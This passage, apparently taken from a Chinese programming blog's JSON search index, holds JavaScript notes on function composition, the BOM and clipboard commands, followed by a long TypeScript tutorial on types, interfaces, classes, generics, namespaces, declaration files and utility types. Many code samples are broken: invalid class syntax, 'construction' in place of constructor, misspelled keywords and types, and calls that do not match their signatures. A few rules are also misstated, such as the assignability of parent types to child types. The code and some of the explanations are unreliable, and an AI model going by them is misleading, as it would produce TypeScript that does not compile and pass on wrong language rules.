100\r}\rfunction c(x){\rreturn x - 100\r}\rfunction d(x){\rreturn x / 100\r}\rfunction e(x){\rreturn x % 100\r}\rlet abc = compose(a,b,c,d,e)(1000)\rlet xyz = compose(a)(1000)\rlet hhh = compose(a,b)(1000)\rconsole.log(xyz)\rconsole.log(hhh)\rconsole.log(abc)\rconsole.log(a(b(c(d(e(1000)))))) //对比一下正确的答案\r惰性函数\n柯里化函数\nclass类的装饰器（Decorator）\nSet/Map/WeakSet/WeakMap\nGenerator生成器和Interator迭代器\n","permalink":"https://99999.fun/posts/61/","summary":"函数被调用时，浏览器会传递两个参数，this和arguments\nthis就是函数的上下文对象，而arguments是一个数组对象（也就是可以通过索引来操作数据），函数调用时传递的参数会在arguments中保存\ncallee属性对应着当前的函数\n例如：\nfunction abc(){\rconsole.log(arguments.length);\rconsole.log(arguments[0]);\rconsole.log(arguments.callee);\rconsole.log(this)\r}\rabc('hallo');\rBOM对象 (Browser Object Model) 是指浏览器对象模型\n该对象提供了浏览器行为和浏览器属性方法\nwindows表示整个浏览器的窗口，同时也是JavaScript最顶层的对象，其他bom对象都是其的属性\nnavigator包含了当前浏览器的全部信息\nconsole.log(window.navigator)\r可以看到输出了很多属性，如userAgent，language等等\nlocation表示当前浏览器地址信息，可以用来跳转到指定地址，获取当前页面的地址等等，例如：\nconsole.log(window.location)\rconst urlData = \u0026quot;https://xiaochenabc123.test.com/;\rwindow.location.href = urlData;\r这个也可以实现跳转\nwindow.location.assign(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)\r这个也可以实现跳转，不过这个不会生成历史记录，是直接用这个页面来替换当前页面\nwindow.location.replace(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)\rreload方法可以重载页面，加上true参数将强制更新\nwindow.location.reload(true)\rhistory表示浏览器的历史记录\nconsole.log(window.history)\rlength表示本次访问网站的数量\n同时也提供了几个方法\nback()返回上个页面\nwindow.history.back()\n可以绑定个点击事件，用来返回上个页面\nforward()前进，一般是和back()搭配使用，一个返回上个页面，一个返回到之前的页面\nwindow.history.forward()\ngo()，前进或者后退指定次数，正数为前进，负数为后退\nwindow.history.go(-1)\nscreen代表用户的屏幕的信息, 获取显示器的相关信息\nconsole.log(window.screen)\rcall 和 apply\naddEventListen()绑定事件函数\nremoveEventListen()移除事件函数\n鼠标按下时onmousedown\n鼠标移动时onmousemove\n鼠标松开时onmouseup\nundefined代表定义未赋值\nnull定义并赋值了, 只是值为null\ndocument.execCommand可以操作剪贴板\ndocument.execCommand(\u0026lsquo;copy\u0026rsquo;) // 复制\ndocument.execCommand(\u0026lsquo;cut\u0026rsquo;) // 剪切\ndocument.execCommand(\u0026lsquo;paste\u0026rsquo;) // 粘贴","title":"JavaScript知识扩展"},{"content":"TypeScript设计目标是开发大型项目，编译成纯JavaScript，让其可以运行在任何浏览器上\nTypeScript可以增强IDE的交互和反馈，主流IDE都支持TypeScript\nTypeScript实质上就是JavaScript的扩展，JavaScript超集\nTypeScript具备类型检查，静态类型，JSnext属性和方法，以及还在提案阶段的语法（例如装饰器）\nTypeScript本身并不能在浏览器运行，需要进行编译成JavaScript（tsc编译）\n全局安装typescript\nyarn global add typescript\n或者\nnpm install -g typescript\n安装ts-node（node不能直接运行ts文件，需要安装ts-node包）\nnpm install -g ts-node\nts-node运行（不需要编译成js文件，直接运行ts）\nts-node hallo.ts\n检查是否安装成功\ntsc -v\n使用TypeScript编写的文件统一以.ts为后缀，用ts写React，统一以.tsx为后缀\n创建tsconfig.json\nnpx tsc \u0026ndash;init\n执行（不加任何参数，这样才能使用tsconfig.json配置文件，tsc默认对当前根目录的ts文件进行编译）\ntsc\n或者指定编译的文件\ntsc ./src/index.ts\ntsc ./src/index.ts -t es6 -m cjs\n注意：cjs标准只能存在一个顶级导出（mudule.exports）,如果存在其他exports的话会被忽略，因此要么不用mudule.exports，要么只使用一个mudule.exports\n编译指定ts文件（在compilerOptions同级）\n\u0026ldquo;include\u0026rdquo;:[\u0026quot;./test1.ts\u0026quot;] // 指定编译哪个ts文件 \u0026ldquo;excclude\u0026rdquo;:[\u0026quot;./test.ts\u0026quot;] // 指定不编译哪个ts文件\n编译TypeScript文件\ntsc hallo.ts\n变量声明\n推荐使用const和let声明变量，而不要使用var声明（因为var具有变量提升和重定义）\n基础类型\nTypeScript具有强类型的特点\nboolean，string，number，array，null，undefined，object，tuple，enum，void，never，any\nboolean布尔值，例如：\nlet hallo: boolean = true\nnumber数值，例如：\nlet hallo: number = 123;\n二进制和八进制，十进制，十六进制都可以用number类型来表示\nstring字符串\nlet hallo: string = hallo;\nvoid类型（当一个函数没有返回值时，那么其返回值类型就可以定义为void）\nfunction voiddemo(): void {\rlet a = 10;\r}\rvoid类型只有两个值，undefined和null\nundefined类型和null类型是所有类型的子类型\nAny（当不清楚类型的变量指定一个类型，有可能这个变量的类型是动态的，想跳过类型检查就可以用这个）\nlet abc: any =123;\nabc = hallo;\nvoid（表示没有任何类型，当一个函数没有返回值，那么其返回值类型就是void）\n声明一个void类型的变量，这个变量只能选择两个值undefined和null其中一个\nlet und void = undefined;\nundefined和null和JavaScript中概念是一样的，空，未定义\nobject，就是非基础类型，和JavaScript中概念是一样的\n枚举，数组，元组，对象都是object类型\nlet obj: object;\narray数组\nlet arrs: number[] = [1,2,3];\nlet arrs: Array = [1,2,3];\ntuple元组：元组类型允许一个数组的元素是不同的类型的，但是必须按照要求来定义，例如\nlet x [string, number?]; x = [\u0026lsquo;hello\u0026rsquo;, 10];\nx.push(\u0026ldquo;hi\u0026rdquo;);\ntuple元组是固定长度，固定类型，长度不能多不能少，类型必须要一一对应\n元组类型允许在类型后缀一个?来说明该元素是可选的，可选元素必须要在必选元素后面，否则有一个元素后面加了?，那么其后面全部元素都要加?\n注意：元组虽然可以越界添加元素（不推荐），但是不可越界访问\nenum枚举（允许为一组数值赋予名字）\nenum hallo {a, b, c}\nhallo.a === 0 // true\n默认从0开始，当然也可以手动指定数值\nenum hallo {a=6, b, c}\n最强大的一处是，可以根据值来得到它的名字\nlet yes: string = hallo[6];\nconsole.log(yes);\n如果分开声明名称相同的枚举，那么就会自动合并\nbigint类型（可以表示任意大的整数，Number类型能表示的最大整数为2^53 - 1）\n在整数后面加n或者调用BigInt()函数来定义bigint，也可以在BigInt()函数中用字符串，这三种方式表达的出来的值都是一样的\nlet abc: bigint = 8888888888888888888888888n\nlet xyz: bigint = BigInt(8888888888888888888888888)\nabc === xyz // true\nSymbol类型（每个symbol值都是唯一的）\nlet abc: symbol = Symbol(\u0026ldquo;hallo\u0026rdquo;)\nlet xyz: symbol = Symbol(\u0026ldquo;hallo\u0026rdquo;)\nabc === xyz // false\nnever类型（表示那些永远不存在的值的类型，永不为真）\nnever类型是任何类型的子类型，也可以赋值给任何类型，但是没有类型是never子类型或者赋值给never类型（除了never本身），连any都不能赋值给never\n抛出异常或者不会有返回值的函数，其函数返回值类型为never\nunknown类型是any类型对应的安全类型\nunknown类型只能赋值给any和unknown类型本身\nlet abc: unknown\nlet a: any = abc // yes\nlet b: unknown = abc // yes\nlet c: number = abc // Error\nunknown类型被确认为某个类型之前，不能被进行函数执行，实例化之类的操作\n类型断言\nas语法\nlet hallo any =hallo;\nlet abc number = (hallo as string).length;\n尖括号语法\nlet hallo any =hallo;\nlet abc number = (stringhallo).length;\n面向对象\n以键值对的方式表示的都是对象，多个键值对用逗号,分隔\nconst obj = {hallo: \u0026lsquo;123world\u0026rsquo;}\nconsole.log(obj.hallo)\nTypeScript在对象被定义时已经设置了类型，当引用不存在的，会报错\ninterface接口\n限制传入的参数的值\ninterface hallo{\ra?: number;\rb: number;\rreadonly c: string;\r[Name: string]: any;\r}\rfunction abc(as: hallo) {\rconsole.log(as.a)\r}\rlet myabc: hallo = {\ra: 123,\rb: 666,\rc: \u0026quot;hallo\u0026quot;,\rxyz(){\rreturn 'hallo word';\r}\r}\rabc(myabc)\r在属性名前使用readonly指定其为只读属性\ninterface和type的区别：interface表示一个对象的属性类型，而type被作为类型别名使用，例如：\ntype testa = sting\rtesta就是sting类型的别名，而interface不能\n在属性名后使用?指定其为可选的\n接口用于类上\nclass Test implements hallo{\ra: 1,\rb: 2,\rc: \u0026quot;abchhh\u0026quot;,\rxyz(){\rreturn 'hallo ts';\r}\r}\r不要把接口来当type用，这是错误的用法，是用来定义一个对象中有哪些属性，有哪些方法，方法里面有哪些属性，参数等等，接口本身就是为了规范一个对象的行为，使用implements关键字就表示该对象就是这个接口的实现\n接口的继承\ninterface hallo{\ra?: number;\rb: number;\rreadonly c: string;\r[Name: string]: any;\r}\rinterface Test extends hallo{\rabcxyz(): string; // 这里继承了hallo接口，并且还给自己定义了个返回值为string类型的abcxyz()方法\r}\rfunction abc(as: Test) {\rconsole.log(as.a)\r}\rlet myabc: Test = {\ra: 123,\rb: 666,\rc: \u0026quot;hallo\u0026quot;,\rxyz(){\rreturn 'hallo word';\r}\rabcxyz(){\rreturn 1+2;\r}\r}\rabc(myabc)\r函数的接口定义\ninterface abc1{\r(test: string): string;\r}\rlet abc: abc1 = (a: string) =\u0026gt; {\rreturn a; }\rlet a = abc('hallo word')\rconsole(a)\r使用[]括起来表示这是任意数量的属性，只要不是已经存在（被定义）的属性\nlet abc: {\rname: string;\rpass: string;\r} = {\rname: 'root',\rpass: '123456'\r};\rlet xyz : number[] = [1,2,3,4,5,6];\rclass Tabcxyz{}\rlet a1: Tabcxyz = new Tabcxyz();\rlet a2: () =\u0026gt; string = () =\u0026gt; {\rreturn 'hallo word'; // 函数返回值类型\r}\r判断数据类型\nlet abc: number = 123;\ntypeof abc === \u0026ldquo;number\u0026rdquo;; // tuer\nts具备自动分析变量类型功能，当无法分析时，才需要使用类型注解\nlet domeTest = 123 // number，自动分析变量类型功\nlet abc: number; // 类型注解\nnumber = 123\n函数\nfunction abc(): number{\rreturn 123; // 这个number表示函数返回值的类型\r}\r函数参数类型\nfunction abc(a:number,b:number): number{\rreturn a+b; // 这个number表示函数返回值的类型\r}\rlet xyz = abc(1+2)\r函数解构参数类型\nfunction abc({a,b}: {a: number,b: number}): number{\rreturn a+b; // 这个number表示函数返回值的类型\r}\rlet xyz = abc(1+2)\r数组与元组（tuple）\n当数组元素存在不同类型时\nlet arr:(number | string | boolean)[] = [1,'hallo', true, 123, 'hhh']; // 表示数组元素可以是number和string和boolean\r数组对象类型\nlet objarr:{name: string, age: number, pass: string}[] = [{\rname: 'root',\rage: 18,\rpass: '123456'\r}]\r或者\ntype objclass = {name: string, age: number, pass: string}\rlet abc : objclass[] = [{\rname: 'root',\rage: 18,\rpass: '123456'\r}]\r或者\nclass Abctest{\rname: string, age: number, pass: string }\rlet abc : Abctest[] = [\rnew Abctest(),\r{\rname: 'root',\rage: 18,\rpass: '123456'\r}\r]\r元组（元组的长度和类型是固定的，数组每一项都必须对于类型的每一项）\nlet abc: [sting, number, sting] = [\r'root',\r18,\r'123456'\r]\r多维元组\nlet abc: [sting, number, sting][] = [\r['root',18,'123456'],\r['admin',16,'123456789'],\r['test',20,'test123'],\r]\r类的定义与继承\nclass Demo{\rname = 'root';\rTest(){\rreturn this.name;\r}\r}\rclass Demo1 extends Demo{\rname = 'admin'; // 重写 name属性\rTest1(){\rreturn 'hallo ts'; // 继承Demo类的同时，自己还具备Demo不存在的Test1()方法\r}\rTest(){\rreturn 'hallo' + super.Test() // 如果在重写父类的方法时，还想调用父类的方法时，可使用super调用\r}\r}\rlet demo1 = new Demo1();\rconsole.log(demo1.Test());\rconsole.log(demo1.Test1());\r类的访问类型（private，protected，public）和构造器（construction）\nclass Test(){\rpublic name: string; // 类外可被调用\rprotected pass: string; // 类内以及被继承到的子类调用\rprivate Testa(){\rconsole.log('hallo word') // 类内可被调用，类外不可调用\r}\r}\rlet test1 = new Test();\rtets1.name = 'hallo';\rconsole.log(tets1.name);\rclass Test1 extends Test{\rpublic Testaa(){\rcosole.log(this.pass);\r}\r}\rconstruction构造器（construction方法是类内部提供的，当一个类被new了，那么该类construction方法就会触发）\nclass Test(){\rpublic name: string;\rprotected pass: string;\rconstruction(name: string){\rthis.name = name;\r}\r}\rlet test1 = new Test('admin');\rcosole.log(test1.name);\r注意：当父类存在construction时，子类也有construction时，需要手动调用父类的construction（调用super()）\n静态类型，setter和getter（暴露私有属性并且保护私有属性）\nclass Test(){\rprivate _name: string; // name属性是私有属性，无法被类外调用\rconstruction(name: string){\rthis._name = name;\r}\rget getName(){\rreturn this._name; // 通过getName方法对外暴露name属性\r}\rset setName(name: string){\rlet Tname = name.split('')[0]; // // 通过setName方法对外暴露name属性\rthis._name = name\r}\r}\rlet test1 = new Test('admin');\rcosole.log(test1.getName);\r单例模式\nclass Test(){\rprivate static Testabc: Test;\rprivate construction(){} // 禁止通过new创建实例\rpublic getTest(){\rif (!this.Testabc) {\rthis.Testabc = new Test(); // 判断如果Testabc不存在时，Testabc等于Test实例\rreturn this.Testabc; // 返回存储了Test实例的属性\r}\rreturn this.Testabc; // 对外暴露这个存储了Test实例的属性\r}\r}\rlet test1 = Test.getTest() // 存储了Test实例的属性赋值给了test1变量\rlet test2 = Test.getTest() // 存储了Test实例的属性赋值给了test2变量\rconsole.log(test1 === test2); // true 这两个存储了Test实例的变量实质上还是同一个\r抽象类（抽象类只能被继承，类的抽象进行封装，复用）\nabstract class Abc{\rname: string;\rabstract getTest1(): string;\r}\rclass Test extends Abc(){\rconstructor(){\rsuper();\r}\rgetTest1(){\rreturn 'hallo word';\r}\r}\rclass Test1 extends Abc(){\rconstructor(){\rsuper();\r}\rgetTest1(){\rreturn 'hallo hhh';\r}\r}\rlet test1 = new Test();\rconsole.log(test1.getTest1);\r联合类型和类型保护\n联合类型就是给一些类型出来，只要满足其中一种类型就可以，例如：\nlet a : number | string = 'hallo word'\ra = 66 // a变量需要满足number或者string其中一种类型就可以了\r类型保护就是通过类型断言，class或者instanceof来保护类型\nenum枚举类型\n枚举通过enum关键字创建，并且枚举元素一被定义将无法改变，格式和对象类似\nenum a{\rname,\rage,\rpass\r}\rconsole.log(a.age) // 1\rconsole.log(a[1]) // age\r枚举元素默认第一个值从0开始递增，另外key和value是能互相访问的（这些规则只能用于数值枚举元素，其他类型无效）\nenum a{\rname = 'root',\rage = 18,\rpass = '123456'\r}\r上面这个例子为异构枚举，允许数值枚举和字符串枚举混合使用\n注意：当然枚举存在字符串枚举成员时，是不能存在计算的\n函数泛型（泛型：generic，表示泛指的类型）\nfunction abc\u0026lt;XYZ\u0026gt;(a: XYZ,b: XYZ){\rreturn a + b; }\rabc\u0026lt;string\u0026gt;('hallo','root');\r类泛型和泛型类型\nclass Demo\u0026lt;XYZ\u0026gt;{\rages: XYZ[]\rgetDemo(a:number): XYZ{\rreturn this.ages[a]\r}\r}\rlet demo = new Demo\u0026lt;number\u0026gt;([1])\rdemo.getDemo(0)\r命名空间namespace（在命名空间内部定义的变量，类只能在该命名空间内部金额访问到，如果需要外部访问需要export导出）\nnamespace Test{\rlet a = \u0026quot;hallo word\u0026quot;;\rexport function b(i: number){\rreturn i;\r}\r}\r命名空间的实现原理就是立即执行函数搭配闭包，闭包可以减少全局变量的诞生，而如果进行导出export了，那么该被导出的变量会暴露到全局环境下\n可以给函数，class，enum枚举类型声明命名空间（必须在声明函数，class，enum之后使用命名空间） 命名空间与函数，class，enum枚举类型同名，命名空间将作为补充，例如：\nfunction Test(){}\rnamespace Test{\rlet a = \u0026quot;hallo word\u0026quot;;\rexport function b(i: number){\rreturn i;\r}\r}\rconsole.log(Test.a,Test.b(123))\r命名空间别名\nimport test = Test.b\r合并命名空间\n如果是同名的命名空间，会自动合并成一个（注意：合并只针对导出的成员，而且不能重名）\n如果是不同文件下命名空间，例如：\na.ts\nnamespace Test{\rlet a = \u0026quot;hallo word\u0026quot;;\rfunction b(i: number)\rreturn i;\r}\rb.ts /// // 会在编译b.ts之前编译a.ts namespace Test{ import a = Test.a console.log(a) }\n类型注解文件（.d.ts）\n类型注解声明需使用declare或export关键字，declare是定义全局，可直接引用，而export需要使用import导出\n注意：当定义interface接口或者type类型的时候，不需要加declare或export关键字\n定义全局变量abc，它的类型是string（除了var关键字可以定义外，还有let，const都可以定义）\ndeclare var abc: string;\r定义全局函数abc()，该函数的参数为string类型，返回值也是对象，并且定义该对象中存在一个data方法，该方法接收一个string类型的参数，该方法的返回值是string类型\ndeclare function abc(param:string): {\rdata: (data: string) =\u0026gt; string;\r};\rabc('test').data('hallo word');\r定义接口 Abc，该接口被用于函数abc()上，表示abc()函数的返回值类型\ninterface Abc{\rtest: (str: string) =\u0026gt;{};\r}\rdeclare function abc(): Abc;\r函数重载：类型注解是允许多次定义函数的类型注解声明\n声明对象Abc，该对象下存在着Test对象，Test对象下存在Data()构造函数\ndeclare namespace Abc {\rnamespace Test {\rclass Data {}\r}\r}\rnew Abc.Test.Data()\r模块化的类型注解\n定义一个Test模块的类型注解，该模块存在一个Abc方法，该方法也存在一个test方法，test方法的返回值为对象\ndeclare module 'Test' {\rinterface Abc{\rtest: (str: string) =\u0026gt;{};\r}\rexport = Abc;\r}\rimport Abc form 'Test'\rAbc.test('hallo word')\r当ts项目需要用到外部库时（例如Jquery），需要提供其类型注解文件，声明其对外的接口，常用的库社区都会提供类型注解文件，一般情况下其类型注解文件都是在该包的源码目录下，如果没有需要进行下载，例如npm i @types/jquery\n泛型的keyof关键字\ninterface Test{\rname: string;\rpass: string;\rage: number;\r}\rclass Abc{\rconstructor(private data: Test)\rgetData\u0026lt;T extends keyof Test\u0026gt;(key: T): Test[T] {\rrenturn this.data[key]\r}\r}\rconst TestData = new Abc({\rname: 'root',\rpass: '123456',\rage: 20\r})\rconst test = TestData.getData('name');\rconsole.log(test)\r从上面例子中的，可以看到keyof的作用就是遍历类型的属性，keyof的返回值类型其实是个联合类型（key也是可以用来搞class）\n上面例子输入的key参数不为Test接口定义属性时会提示错误\n装饰器：装饰器本身是函数，装饰器通过@来调用，通过装饰器来扩展目标的功能\n注意：装饰器目前是实验功能，需要手动开启实验功能，在tsconfig.json找到experimentalDecorators和emitDecoratorMetadata设置为true\n类的装饰器（会在类创建完毕后立即执行装饰器，注意：对类装饰，并不对实例装饰，类装饰器的参数是构造函数）\nfunction Abc(constructor: any){\rconsole.log('hallo word');\r}\r@Abc\rclass Test{}\rlet test = new Test();\r方法的装饰器（方法装饰器有3个参数，分别是类的构造方法，方法名，方法的属性描述符）\n属性的装饰器（属性装饰器有2个参数，分别是类的原型，属性名）\n参数的装饰器（函数的参数装饰器有3个参数，分别是类的构造函数，参数名，参数在参数列表中的索引）\n协变和逆变\nTypeScript允许子类型赋值给父类型，也允许父类型赋值给子类型，因为这是类型安全的，是完全允许的，例如：\ntype Test = {\rname: string;\r}\rtype Abc = {\rname: string;\rpass: string;\r}\rlet a: Test = {\rname: 'root'\r}\rlet b: Abc = {\rname: 'root'\rpass: '123456'\r}\rb = a\r子类型可以赋值给父类型，而这个就叫协变，允许赋值时给一个更全面的类型或者相同的类型（父类是子类的超类）\nTypeScript不需要通过extends继承来确定，而是通过类型结构（structual type）来确定父子关系的\n逆变\n父类型可以赋值给子类型，函数参数具有逆变的特性，例如：\ntype Test = {\rname: string;\r}\rtype Abc = {\rname: string;\rpass: string;\r}\rlet hallo = (a: Abc) =\u0026gt;{\rconsole.log(a)\r}\rlet hi = (b: Test) =\u0026gt;{\rconsole.log(b)\r}\rhallo = hi\r注意：协变和逆变作用只生效于父子类型，非父子类型不会发生\nts允许符合一个接口的前提下扩展，但是有个例外，不允许使用字面量的方式（但是可以使用as和\u0026lt;\u0026gt;类型断言来允许）\n可索引接口，索引签名\n函数接口\nlet abc:(a:number,b:number)=\u0026gt; number\rinterface abc{\r(a:number,b:number):number\r}\r函数接口的实现要求形参和实参必须一一对应（可选参数和剩余参数（扩展）除外）\n函数重载（ts允许函数名相同，但是参数个数和类型不相同）\nfunction abc(...a: number[]): number\rfunction abc(...a: string[]): string\rfunction abc(...a: any[]):any{\rlet xyz = a[0]\rif(typeof xyz === 'string'){\rreturn a.join('')\r}\rif(typeof xyz === 'number'){\rreturn a.reduce((x,y)=\u0026gt;x+y)\r}\r}\r多态：通过父类抽象方法，让子类可以重写该方法\n类接口和实现的成员修饰符必须相等，不能接口是公有属性，实现变成的私有属性\n接口可以继承多个接口，多个接口用逗号分隔，而且该接口的实现必须满足多个接口的要求\n接口也可以继承类，一个子类可以继承父类的同时还可以实现接口\n接口只能约束类的公有成员，接口可以抽离类的公有，私有，受保护成员\nts类型检查机制：类型推断，类型兼容性，类型保护\n类型推断：ts可以根据规则来自动推断出一个类型，基础类型推断，最佳通用类型推断，以及上下文类型推断\n类型断言可以覆盖ts的自动类型推断，错误的类型断言很危险\n类型兼容：ts允许一个子类类型兼容父类\ntype a = {\raa: number\r}\rtype b = {\raa: number,\rab: string\r}\rlet abc: a = {aa:1}\rlet xyz: b = {aa:2,ab:'hallo'}\rabc = xyz\r// xyz = abc 不兼容，因为abc不符合xyz类型的要求，但是xyz符合abc的类型（在满足类型要求上扩展类型）\r源类型满足目标类型的要求时，源类型可以赋值给目标类型\n函数类型兼容：源函数参数个数必须小于等于目标函数，固定参数可以兼容可选参数和扩展参数，但是可选参数是不兼容固定参数和扩展参数的，扩展参数兼容固定参数和可选参数，而且参数类型必须匹配\nlet abc = (a:number,b:number) =\u0026gt;{}\rlet xyz = (a:number) =\u0026gt;{}\rabc = xyz\r接口的类型兼容：a接口的定义满足b接口的定义时，a的实现可以赋值给b的实现（多兼容少的）\ninterface A{abc: number}\rinterface B{abc: number,xyz: string}\rlet a = (abc: A) =\u0026gt; {}\rlet b = (abc: B) =\u0026gt; {}\rb = a\r类型保护：在某个特定的区块中保证变量属性某个确认的类型，在该区块可以放心使用该类型的属性和方法\n可以用类型也可以用类 if(abc instanceof number){}else{}\n对象属性 if(\u0026lsquo;data\u0026rsquo; in abc){}else{}\n基本类型 if(typeof a === \u0026lsquo;string\u0026rsquo;){}else{}\n类型位词\nfunction isnumber(a: abc | xyz): a is number{\rreturn (a as abc).data !== undefined\r}\r通过返回值来确定类型\n高级类型（这些高级类型更像是工具类型）\n交叉类型与联合类型\ninterface A{abc: number}\rinterface B{abc: number,xyz: string}\rlet hhh : A \u0026amp; B = {\rabc: 123,\rxyz: 'hallo'\r}\rhhh实现具备了A和B接口全部特性，交叉类型是取全部接口的并集\nlet a: number | string = 'hallo'\r联合类型还可以通过字面量来限制变量的取值\nlet a: 1 | 2 | 3\r联合类型对于类只能访问其共有成员（取交集）\nclass a{\rdata(){}\rabc(){}\r}\rclass b{\rdata(){}\rxyz(){}\r}\renum gg{a,b}\rlet hhh = gg.a ? new a() : new b{}\rhhh.data()\r也可以利用联合类型来根据共用成员的值来做类型保护区块\n索引类型（对于索引做类型约束）\ninterface B{abc: number,xyz: string}\rlet key: keyof B\rlet value: B['abc']\rlet obj={a:'hallo',b:'abc',c:'xyz'}\rfunction get\u0026lt;T, K extends keyof T\u0026gt;(obj: T,keys:K[]): T[K][]{\rreturn keys.map(key =\u0026gt; obj[key]) }\rget(obj,['a','b','c'])\r当索引不存在的属性时，ts会报错提示\n映射类型\ninterface A{abc: string,xyz: number, hhh: boolean}\rtype a = Readonly\u0026lt;A\u0026gt;\r可以看到类型别名a是对于属性是只读的\nReadonly的实现是索引类型\ntype Readonly\u0026lt;T\u0026gt; ={readonly [P in keyof T]: T[P]}\r把接口属性变成可选的\ntype b = Partial\u0026lt;A\u0026gt;\rPartial的实现\ntype Partial\u0026lt;T\u0026gt; = {[P in keyof T]?: T[P]}\rRequired将接口属性变成必选\ntype c = Required\u0026lt;A\u0026gt;\rRequired的实现\ntype Required\u0026lt;T\u0026gt; = {[P in keyof T]-?: T[P]}\r抽取接口的指定属性，来创建一个新的类型\ntype abc = Pick\u0026lt;A,'abc','xyz'\u0026gt;\rPick的实现\ntype Pick\u0026lt;T,K extends keyof T\u0026gt; = {[P in K]: T[P]}\rOmit去除指定属性，来创建一个新的类型\ntype abc = Omit\u0026lt;A,'abc','hhh'\u0026gt;\rOmit的实现\ntype Omit\u0026lt;T,K extends keyof any\u0026gt; = Pick\u0026lt;T, Exclude\u0026lt;keyof T,K\u0026gt;\u0026gt;\r上面的被ts官方叫统态（不会创建新的属性）\nRecord通过传入的泛型参数来作为接口的属性和值\ninterface A{abc: string,xyz: number, hhh: boolean}\rtype xyz = 'a' | 'b' | 'c'\rlet abc: Record\u0026lt;xyz, A\u0026gt; = {\ra:{\rabc: 'hallo',\rxyz: 123,\rhhh: true\r},\rb:{\rabc: \u0026quot;abc\u0026quot;,\rxyz: 666,\rhhh: false\r},\rc:{\rabc: 'hhh',\rxyz: 12345,\rhhh: false\r},\r}\rRecord的实现\ntype Record\u0026lt;K extends keyof any, T\u0026gt; = {[P in K]: T}\r条件类型\ntype A\u0026lt;T\u0026gt; = T extends number ? 'number': T extends string ? 'sting': T extends Function ? 'function': 'object'\rtype Ta = A\u0026lt;string\u0026gt;\rtype Tb = A\u0026lt;Function\u0026gt;\r分布式条件类型\ntype Tc = A\u0026lt;string | number\u0026gt;\r下面的例子中diff可以过滤掉T可以赋值给U的属性\ntype diff\u0026lt;T,U\u0026gt; = T extends U ? never: T\rtype Ta\u0026lt;T\u0026gt; = diff\u0026lt;T,undefined | null\u0026gt;\rtype Tb = Ta\u0026lt;string | undefined | null | number\u0026gt;\r实质上diff类型官方已经提供了，叫Exclude\u0026lt;T,U\u0026gt; Ta类型ts官方叫NonNullable\nExtract\u0026lt;T,U\u0026gt;是Exclude\u0026lt;T,U\u0026gt;的取反，Extract\u0026lt;T,U\u0026gt;会T抽取出可以赋值给U的类型，例如：\ntype Tc = Extract\u0026lt;'a'|'b'|'c','a'|'c'\u0026gt;\rReturnType，获取函数返回值的类型\ntype Td = ReturnType\u0026lt;()=\u0026gt;string\u0026gt; ReturnType的实现\ntype ReturnType\u0026lt;T extends (...args: any) =\u0026gt;any\u0026gt; = T extends (...args: any) =\u0026gt; infer R ? R : any\r意思是T可以赋值给一个函数，这个函数接收不指定数量的参数，参数类型为any，返回值也是any，利用infer延迟推断类型，如果类型为R就返回R，否则返回any\nConstructorParameters获取构造函数的构造参数\nclass B{\rconstructor(name: string,pass: string, mail?: string){}\r}\rtype Bb = ConstructorParameters\u0026lt;typeof B\u0026gt;\rConstructorParameters的实现（通过infer来推断构造参数的类型）\ntype ConstructorParameters\u0026lt;T extends abstract new (\u0026hellip;args: any) =\u0026gt; any\u0026gt; = T extends abstract new (\u0026hellip;args: infer P) =\u0026gt; any ? P : never\nParameters获取函数的参数\ntype Tb = Parameters\u0026lt;(a:number,b:string,c?:boolean)=\u0026gt; void\u0026gt;\rParameters的实现\ntype Parameters\u0026lt;T extends (...args: any) =\u0026gt; any\u0026gt; = T extends (...args: infer P) =\u0026gt; any ? P : never\rThisParameterType获取函数的this参数类型\ntype Tc = ThisParameterType\u0026lt;(this: number,a: string) =\u0026gt; void\u0026gt;\rThisParameterType的实现\ntype ThisParameterType\u0026lt;T\u0026gt; = T extends (this: infer U, ...args: never) =\u0026gt; any ? U : unknown\rThisType指定this的类型\nOmitThisParameter去除函数中的this类型\ntype Te = OmitThisParameter\u0026lt;(this: number, a: string) =\u0026gt; string\u0026gt;\rOmitThisParameter的实现\ntype OmitThisParameter\u0026lt;T\u0026gt; = unknown extends ThisParameterType\u0026lt;T\u0026gt; ? T : T extends (...args: infer A) =\u0026gt; infer R ? (...args: A) =\u0026gt; R : T\rUppercase将字符串字面量转换成大写\nLowercase将字符串字面量转换成小写\nCapitalize将字符串字面量的第一个字母转换为大写\nUncapitalize将字符串字面量的第一个字母转换为小写\ntype Ta1 = Uppercase\u0026lt;'Hello'\u0026gt;\rtype Tb1 = Lowercase\u0026lt;Ta1\u0026gt;\rtype Tc1 = Capitalize\u0026lt;Tb1\u0026gt;\rtype Td1 = Uncapitalize\u0026lt;Tc1\u0026gt;\r实现分别为\ntype Uppercase\u0026lt;S extends string\u0026gt; = intrinsic\rtype Lowercase\u0026lt;S extends string\u0026gt; = intrinsic\rtype Capitalize\u0026lt;S extends string\u0026gt; = intrinsic\rtype Uncapitalize\u0026lt;S extends string\u0026gt; = intrinsic\rdeclare\nts允许声明同名接口，新的同名接口的属性将作为新属性（合并接口），但是不允许重复声明接口的类型，例如：\ninterface AA {\rname: string;\r}\rinterface AA {\rid: number;\r}\rlet aa: AA={\rname: 'root',\rid: 1\r}\r注意：接口合并时，非函数类型的属性的类型必须一致，而函数类型的属性将被认为是函数重载，如果使用函数类型的属性时类型不一致，需要提供一个更宽泛的类型（参数和返回值的类型），必须包含其全部类型\n合并接口，按照声明的顺序来排，后声明的接口优先级高于前面声明的接口，而接口内部是从上往下排序，但是有个例外，就是当使用字面量作为类型时，使用字面量当类型的属性将会提升到最顶端\n也可以利用函数重载（后声明的接口具备更高的优先级，请不要在最后面使用泛型，在后面使用泛型会因为优先级的原因导致后面的类型全是泛型）\ninterface BB {\rfuns(id: any):any\r}\rinterface BB {\rfuns(id: string):string\r}\rinterface BB {\rfuns(id: number):number\r}\rlet bb: BB ={\rfuns(id:any){\rreturn id\r}\r}\rlet b1 = bb.funs(1)\rlet b2 = bb.funs('root')\rlet b3 = bb.funs(true)\r同样，命名空间也可以像这样合并，但是非export成员只能在原本的命名空间可见\n注意：当定义了一个类类型时，这个类类型不能合并，因为它是值又是类型的特殊对象\ntsconfig.json配置文件应用\nrootDir（指定输入目录） outDir（指定输出目录） allowJs（是否处理js文件） 